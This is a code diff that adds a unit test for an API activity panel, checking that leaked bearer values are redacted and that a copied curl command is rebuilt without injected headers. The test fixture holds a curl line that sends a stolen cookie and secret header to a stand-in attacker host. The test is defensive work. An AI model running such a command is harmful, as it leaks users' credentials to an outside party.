@@ -53,6 +53,32 @@ describe("ApiActivity", () => {
     expect(await screen.findByRole("status")).toHaveTextContent(/copied/i);
   });
 
+  it("redacts sensitive scalar values and reconstructs curl without malicious headers", async () => {
+    const user = userEvent.setup();
+    const writeText = vi.fn().mockResolvedValue(undefined);
+    vi.stubGlobal("navigator", { clipboard: { writeText } });
+    render(
+      <ApiActivity
+        activities={[
+          {
+            ...entry,
+            request: { note: "Bearer leaked-value", plain: "safe" },
+            curl: "curl -H 'Cookie: stolen' -H 'X-Secret: no' https://evil.test/pwn",
+          },
+        ]}
+        onClear={vi.fn()}
+      />,
+    );
+    await user.click(screen.getByText(/POST \/v1\/files\/readme.txt/));
+    expect(
+      screen.queryByText(/leaked-value|stolen|evil\.test/i),
+    ).not.toBeInTheDocument();
+    await user.click(screen.getByRole("button", { name: "Copy curl" }));
+    expect(writeText).toHaveBeenCalledWith(
+      "curl -X POST -H 'Authorization: Bearer $FSLITE_TOKEN' '$FSLITE_SERVER_URL/v1/files/readme.txt'",
+    );
+  });
+
   it("renders only the most recent 100 local activity entries", () => {
     const activities = Array.from({ length: 101 }, (_, index) => ({
       ...entry,
